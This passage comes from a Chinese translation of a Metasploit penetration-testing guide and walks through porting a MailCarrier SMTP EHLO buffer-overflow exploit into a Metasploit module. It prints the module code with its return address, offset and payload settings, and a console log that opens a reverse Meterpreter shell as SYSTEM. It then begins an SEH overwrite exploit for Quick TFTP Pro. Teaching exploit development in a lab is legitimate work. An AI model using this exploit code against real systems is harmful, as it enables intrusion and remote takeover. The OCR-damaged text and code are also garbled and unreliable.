def exploit
connect
Osploit="EHLo“
sploituseexploit/windows/smtp/mailcarrier_book
msf exploit(mailcarrier_book) > show options
Module options:
Name
Current Setting RequiredDescription
LHOST
yes
The local address
RHOST
yes
The target address
RPORT25
yes
The target port
Exploit target:
IdName
o
Windows XP SP2-EN
msfexploit(mailcarrier_book)>setLH0sT192.168.1.101
LHOST => 192.168.1.101
msf exploit(mailcarrier_book)>set RH0ST 192.168.1.155
RHOST => 192.168.1.155
0 msf exploit(mailcarrier_book) > set payload generic/debug_trap
payload=>generic/debug_trap
msf exploit(mailcarrier_book)>exploit
[*]Exploit completed,but no session was created.
msf exploit(mailcarrier_book）>
我们跟进行实际的渗透测试一样设置好配置选项，所不同的只是选择了generic/debug_trap
攻击载荷来测试我们的渗透代码。
在渗透攻击模块运行起来之后，调试器应该会暂停下应用程序的运行，而EIP寄存器已经
被覆盖为42424242，如图15-1所示，如果你看到EIP已经成功地被改写为42424242，你就已
区和伪造的攻击载荷也已经跟预期一样被加载到缓冲区中。
220
---
## Page 248
第15章将渗透代码移植到Metasploit框架
图15-1MailCarrier初始溢出攻击成功改写EIP
15.2.4实现框架中的特性
在验证渗透攻击模块基本架构可以正常工作并改写EIP地址之后，可以接下来慢慢来实现
在Metasploit框架中的一些特性。我们先来在‘Target’区中配置目标返回地址到JMPESP指令
地址上，可以使用原先渗透代码中的同一地址，这个地址是在WindowsXPSP2的SHELL32.DLL
中找到的。对于其他操作系统版本，则需要找出合法的指向JMPESP的返回地址，从而使得渗
透代码能够在那些平台上也能正常运行。要记住的是，公开的渗透代码有些只在特定的操作系
统上才能正常工作，这个案例也是这样的。我们使用的是SHELL32.DLL中的地址，而这个地址
在不同版本或不同的ServicePack上会变化。如果我们能够在目标应用软件的内存地址中找到
一个标准的JMPESP指令地址，那就可以不需要借用WindowsDLL中的地址了，那么就可以
使得渗透代码对于所有的Windows操作系统平台都是通用的，因为这样一个内存地址将不会
变化。
'Targets'=>
[
['Windows XP SP2-EN'，{‘Ret'=>0x7d17dd13}]，
],
Metasploit会在运行时刻把返回地址加入到渗透过程中，你可以在渗透攻击代码区中使用
[target[Ret']].pack(V)把返回地址替换进来，这会把返回地址转换为低字节序并插入到渗透攻击
数据中（低字节序一little-endian，字节序是由目标系统CPU体系结构确定的，Intel兼容的处理
器使用低字节序）。
221
---
## Page 249
Metasploit渗透测试指南
提示：如果你声明了多个目标系统类型，这一行将根据你运行渗透攻击时选择的目标系
统target配置选项，来选择恰当的返回地址。这也显示出将渗透代码移植到Metasploit框架中
会大大提升渗透攻击的通用性。
Sploit="EHLO"
Sploit
[
O['Windows XP SP2 - EN',{'Ret'=> 0x7d17dd13,'0ffset'=> 5093 }］,
],
222
---
## Page 250
第15章将渗透代码移植到Metasploit框架
在这里声明offset之后O，你就不再需要在渗透代码中手工的包含一大串字符A，这是一个
非常有用的特性，特别是在缓冲区长度可能在不同操作系统版本中会变化的情况中。
现在我们可以修改渗透攻击代码区，使得Metasploit自动生成一个随机化的大写字符字符
串，在运行时刻替换5093个字符A，这样每次运行渗透代码都会产生出一个独特的攻击缓冲区。
（可以使用rand_text_alpha_upper来完成上述目标，但我们还可以选择其他的随机化函数，可以
在Back|Track攻击机上的/opt/metasploit/msf3/lib/rex/路径下的text.rb文件中，查看到所有可用
的随机化文本生成函数）。
sploit="EHLO“
sploit windows/meterpreter/reverse_tcp
msf exploit(mailcarrier_book）>exploit
[*]Started reverse handler on 192.168.1.101:4444
[*]Sending stage (747008 bytes)
[*] Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.155:1265)
meterpreter >getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter>
15.2.8我们完整的模块代码
做一个总结，下面就是这个Metasploit渗透攻击模块的完整的最终代码：
'msf/core
etasploit3'TABS MailCarrier V2.51 SMTP EHLO Overflow',
'Description'
}b%['Your Name'],
'Arch'
=>[ARCH_X86 ]，
'License'
=> MSF_LICENSE,
'Version'
=>'$Revision:7724 $'
'References'
=>
'CVE'，‘2004-1638′]，
'OSVDB'，‘11174'］,
‘BID'，‘11535′],
[‘URL'，‘http://www.exploit-db.com/exploits/598′],
'Privileged'
=>true,
'Defaultoptions'
'thread',
'Payload'
=>
'Space'
=>1000,
,sreppeg.
=>"\x00\x0a\x0d\x3a"，
'StackAdjustment'
=>-3500,
},
'Platform’=> ['win'],
'Targets'
=>
[‘Windows XP SP2 -EN'，{‘Ret′=> Ox7d17dd13，‘Offset’
'DefaultTarget'
((o<=
register_options(
Opt::RPORT(25),
Opt::LHOST(), # Required for stack offset
],self.class)
end
def exploit
connect
sploit="EHLO “
sploit<rand_text_alpha_upper(target['Offset'])
sploit << [target['Ret']].pack('v')
sploit < make_nops(32)
sploit<<payload.encoded
225
---
## Page 253
Metasploit渗透测试指南
sock.put(sploit +"\r\n")
handler
disconnect
end
15.3SEH覆盖渗透代码
覆盖渗透代码到Metasploit框架中。SEH覆盖指的是覆盖应用程序异常处理链的指针内容。在
一次SEH覆盖中，我们将尝试绕过在一个错误或崩溃发生时尝试关闭应用程序的异常处理流
程。在这个渗透代码中，应用程序触发一个异常时，当它执行到一个你已经控制的指针，你就
可以将程序执行流程导向你的shellcode。这个渗透代码比一个简单的缓冲区溢出要稍微复杂一
些，但它还是非常优美的。
完全的代码执行。POP-POP-RETN是一项普遍使用的绕过SEH并执行自己的代码的攻击技术。
在那里就可以执行我们构造好的内存指令。
提示：了解更多关于SEH覆盖的技术，你可以参考http://www.exploit-db.com/download
_pdf/10195/。②
QuickTFTPPro2.1渗透代码是由Muts编写的，你可以从http://www.exploit-db.com/exploit
s/5315/找到完整的渗透代码，以及存在漏洞的应用程序。我们已经在这里将代码进行精简，使
得能容易地移植到Metasploit框架中，比如去除了攻击载荷。剩余的骨架代码拥有我们在
Metasploit中需要该渗透攻击的所有信息。
#!/usr/bin/python
#Quick TFTP Pro 2.1 SEH Overflow(oday)